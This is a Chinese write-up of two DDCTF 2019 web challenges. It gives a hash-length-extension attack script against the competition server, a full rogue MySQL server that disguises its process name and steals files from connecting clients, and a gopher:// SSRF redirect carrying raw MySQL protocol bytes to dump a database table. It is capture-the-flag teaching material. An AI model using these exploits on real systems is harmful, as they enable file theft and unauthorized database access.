# DDCTF 2019 web 吃鸡 && mysql write up
## 大吉大利今晚吃鸡
  本题模拟的是某版本thrift go 和java 通信导致的精度丢失问题.解题方法有很多,我这里只给出我认为最优雅的解题方法.

  接口 : /ctf/api/buy_ticket?ticket_price=本处接口存在int64 转int32 精度丢失问题.
所以只需要将price的低32为在100范围内即可如:
98998996172801
10110100000101000000000000000000000000000000001

通过了订单再通过md5_hash扩展攻击遍历机器人将其remove,脚本如下
```
import hashpumpy
import requests
import json
import time
from urllib import quote_plus

def get_hash(hash_val,org,app,len):

    result= []
    tmp = hashpumpy.hashpump(hash_val, org, app, len)
    hash = tmp[0]
    hex_str = tmp[1]
    url_str = quote_plus(hex_str)
    result.append(hash)
    result.append(hex_str)
    result.append(url_str)

    return result

class remove_robot(object):

	def __init__(self, user_name, password, id, hash):

		self.s = requests.session()
		self.r = self.s.get('http://117.51.147.155:5050/ctf/api/login?name={}&password={}'.format(user_name, password))
		self.id = id
		self.flag = ''
		self.hash = hash
		self.len = 0
	def remove_robot(self):

		for i in range(1, 151):

			m = get_hash(self.hash, 'id{}'.format(self.id), 'id{}'.format(i), self.len)
			hash = m[0]
			print m[2]
			str = ''.join(m[2].rsplit('id{}'.format(i), 1))
			print str
			print "http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(str, i, hash)
			r = self.s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(str, i, hash))
			print r.text
			time.sleep(1)
			if json.loads(r.text)['code'] == 200:
				print(i)
		return 'success'


	def get_key_len(self):

		for i in range(1,50):
			m = get_hash(self.hash, 'id{}'.format(self.id),'id{}'.format(self.id), i)
			hash = m[0]
			str = m[2].rstrip('id{}'.format(self.id))
			r = self.s.get("http://117.51.147.155:5050/ctf/api/remove_robot?{}=&id={}&ticket={}".format(str,self.id,hash))
			time.sleep(1)
			if json.loads(r.text)['code'] == 200:
				self.len = i
				print 'key_len'
				print (self.len)
				break
		return self.len

	def get_flag(self):

		r = self.s.get('http://117.51.147.155:5050/ctf/api/get_flag')

		print r.text
		return r.text

if __name__ == "__main__":

	test = remove_robot(user_name='test_1234',password='12345678',id='78', hash ='b2bb02eef20fa954e1aa82ca6a3d4167')
	test.get_key_len()
	test.remove_robot()
	test.get_flag()

```

脚本跑出来的flag
{"code":200,"data":["DDCTF{chiken_dinner_hyMCX[n47Fx)}"],"msg":"\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21"}

## mysql 弱口令
本题目是简单的反攻弱口令扫描器的思路,但是目前write up都忽略了curl的ssrf.
mysql钓鱼脚本
```
#!/usr/bin/env python
#coding: utf8


import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers

import procname
import ctypes

procname.setprocname("mysqld")

libc = ctypes.CDLL('libc.so.6')

libc.prctl(15,'mysqld',0 ,0 ,0)


PORT = 3306

log = logging.getLogger(__name__)

log.setLevel(logging.INFO)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
    '/home/dc2-user/ctf_web_1/web_1/app/main/views.py',
)


#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',  # Protocol
                    '5.6.28-0ubuntu0.14.04.1' + '\0',
                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                ))            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)


z = mysql_listener()
# daemonize()
asyncore.loop()
```

在运行angent.py 把ip填入扫描器进行扫描,读取bash history文件拿到views文件的路径

读views.py
```
# coding=utf-8

from flask import jsonify, request
from struct import unpack
from socket import inet_aton
import MySQLdb
from subprocess import Popen, PIPE
import re
import os
import base64


# flag in mysql  curl@localhost database:security  table:flag

def weak_scan():

    agent_port = 8123
    result = []
    target_ip = request.args.get('target_ip')
    target_port = request.args.get('target_port')
    if not target_port.isdigit():
        return jsonify({"code": 0, "msg": "端口必须为数字", "data": []})
    if not checkip(target_ip):
        return jsonify({"code": 0, "msg": "必须输入ip", "data": []})
    if is_inner_ipaddress(target_ip):
        return jsonify({"code": 0, "msg": "ip不能是内网ip", "data": []})
    tmp_agent_result = get_agent_result(target_ip, agent_port)
    if not tmp_agent_result[0] == 1:
        result.append(base64.b64encode(tmp_agent_result[1]))
        return jsonify({"code": 0, "msg": "服务器未开启mysql", "data": result})

    tmp_result =mysql_scan(target_ip, target_port)

    if not tmp_result['Flag'] == 1:

        result.append(base64.b64encode(tmp_agent_result[1]))
        return jsonify({"code": 0, "msg": "未扫描出弱口令", "data": []})
    else:
        result.append(base64.b64encode(tmp_agent_result[1]))
        result.append(tmp_result)
        return jsonify({"code": 0, "msg": "服务器存在弱口令", "data": result})


def checkip(ip):
    p = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
    if p.match(ip):
        return True
    else:
        return False

def curl(url):
    tmp = Popen(['curl', url, '-L', '-o', 'content.log'], stdout=PIPE)
    tmp.wait()
    result = tmp.stdout.readlines()
    return result

def get_agent_result(ip, port):

    str_port = str(port)
    url = 'http://'+ip + ':' + str_port
    curl(url)
    if not os.path.exists('content.log'):
        return (0, '未开启agent')
    with open('content.log', 'rb') as f1:
        tmp_list = f1.read()
        response = tmp_list
    os.remove('content.log')
    if not 'mysqld' in response:
        return (0, response)
    else:
        return (1, response)


def ip2long(ip_addr):

    return unpack("!L", inet_aton(ip_addr))[0]

def is_inner_ipaddress(ip):

    ip = ip2long(ip)
    return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
            ip2long('10.0.0.0') >> 24 == ip >> 24 or \
            ip2long('172.16.0.0') >> 20 == ip >> 20 or \
            ip2long('192.168.0.0') >> 16 == ip >> 16

def mysql_scan(ip, port):

    port = int(port)
    weak_user = ['root', 'admin', 'mysql']
    weak_pass = ['', 'mysql', 'root', 'admin', 'test']
    Flag = 0
    for user in weak_user:
        for pass_wd in weak_pass:
            if mysql_login(ip,port, user, pass_wd):
                Flag = 1
                tmp_dic = {'weak_user': user, 'weak_passwd': pass_wd, 'Flag': Flag}
                return tmp_dic
            else:
                tmp_dic = {'weak_user': '', 'weak_passwd': '', 'Flag': Flag}

    return tmp_dic



def mysql_login(host, port, username, password):
    '''mysql login check'''

    try:
        conn = MySQLdb.connect(
            host=host,
            user=username,
            passwd=password,
            port=port,
            connect_timeout=1,
            )
        print ("[H:%s P:%s U:%s P:%s]Mysql login Success" % (host,port,username,password),"Info")
        conn.close()
        return True
    except MySQLdb.Error, e:

        print ("[H:%s P:%s U:%s P:%s]Mysql Error %d:" % (host,port,username,password,e.args[0]),"Error")
        return False

```

代码里提示:flag in mysql  curl@localhost database:security  table:flag

有个提示非常明显的ssrf

所以在vps的8123端口构造302条转 header里的location对应gopher协议接上mysql协议url编码后的内容


示例:
```
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Location: gopher://localhost:3306/_%3c%00%00%01%85%a6%0f%20%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%75%72%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%09%00%00%00%02%73%65%63%75%72%69%74%79%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01
Content-Length: 0
Server: Werkzeug/0.14.1 Python/2.7.5
Date: Tue, 07 May 2019 07:28:31 GMT
```

即可读到flag

{"code":404,"data":["SgAAAAo1LjYuNDMALQIAADpdRHxkYTtBAP/3CAIAf4AVAAAAAAAAAAAAAHI+fXpsL0RJI21+VQBteXNxbF9uYXRpdmVfcGFzc3dvcmQABwAAAgAAAAIAAAABAAABAScAAAIDZGVmAAAAEUBAdmVyc2lvbl9jb21tZW50AAwhAFQAAAD9AAAfAAAFAAAD/gAAAgAdAAAEHE15U1FMIENvbW11bml0eSBTZXJ2ZXIgKEdQTCkFAAAF/gAAAgABAAABASAAAAIDZGVmAAAACkRBVEFCQVNFKCkADCEAZgAAAP0AAB8AAAUAAAP+AAACAAEAAAT7BQAABf4AAAIABwAAAQAAAAIAAAABAAABAUsAAAIDZGVmEmluZm9ybWF0aW9uX3NjaGVtYQhTQ0hFTUFUQQhTQ0hFTUFUQQhEYXRhYmFzZQtTQ0hFTUFfTkFNRQwhAMAAAAD9AQAAAAAFAAAD/gAAIgATAAAEEmluZm9ybWF0aW9uX3NjaGVtYQYAAAUFbXlzcWwTAAAGEnBlcmZvcm1hbmNlX3NjaGVtYQkAAAcIc2VjdXJpdHkFAAAI/gAAIgABAAABAVoAAAIDZGVmEmluZm9ybWF0aW9uX3NjaGVtYQtUQUJMRV9OQU1FUwtUQUJMRV9OQU1FUxJUYWJsZXNfaW5fc2VjdXJpdHkKVEFCTEVfTkFNRQwhAMAAAAD9AQAAAAAFAAAD/gAAIgAFAAAEBGZsYWcFAAAF/gAAIgAsAAABA2RlZghzZWN1cml0eQRmbGFnBGZsYWcCaWQCaWQMPwALAAAAAwEQAAAAATAvAAACA2RlZghzZWN1cml0eQRmbGFnBGZsYWcEZmxhZwRmbGFnDCEA/QIAAP4AAAAAAPsFAAAD/gAAAgABAAABAioAAAIDZGVmCHNlY3VyaXR5BGZsYWcEZmxhZwJpZAJpZAw/AAsAAAADARAAAAAuAAADA2RlZghzZWN1cml0eQRmbGFnBGZsYWcEZmxhZwRmbGFnDCEA/QIAAP4AAAAAAAUAAAT+AAAiACoAAAUBMSdERENURnswYjVkMDVkODBjY2ViNGI4NWM4MjQzYzAwYjYyYTdjZH0FAAAG/gAAIgA="],"msg":"\u670d\u52a1\u5668\u672a\u5f00\u542fmysql"}

解码后为
DDCTF{0b5d05d80cceb4b85c8243c00b62a7cd}

